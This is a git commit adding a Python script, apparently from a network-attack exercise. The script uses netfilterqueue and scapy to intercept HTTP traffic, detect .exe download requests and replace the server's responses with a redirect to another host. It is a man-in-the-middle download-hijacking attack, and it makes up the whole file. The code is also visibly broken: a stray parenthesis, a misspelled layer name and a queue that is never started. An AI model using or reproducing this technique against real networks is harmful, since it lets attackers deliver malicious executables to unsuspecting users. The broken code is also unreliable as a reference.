a8a0b05c7ede55ec0dffb6a3c0e1068a074d1bcc
Gonzalo Hermenegildo <gonzalo@hermenegildo.org>
2020-06-27 10:59:24 +0200

    First Commit

---
+++ replace_download.py
@@ -0,0 +1,41 @@
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+
+    if scapy_packet.haslayer(scapy.Raw):
+
+        if scapy_packet[scapy.TCP].dport == 10000:
+            print('HTTP Request')
+            if '.exe' in str(scapy_packet[scapy.Raw].load) and '10.0.2.16' not in scapy_packet[scapy.Raw].load:
+                print('[+] exe Request')
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+)
+
+        elif scapy_packet[scapy.TPC].sport == 10000:
+            print('HTTP Response')
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print('[+] Replacing file')
+                modified_packet = set_load(scapy_packet, 'HTTP/1.1 301 Moved Permanently\n Location: http://www.example.org/index.asp\n\n')
+
+                packet.set_payload(bytes(scapy_packet))
+
+                
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run
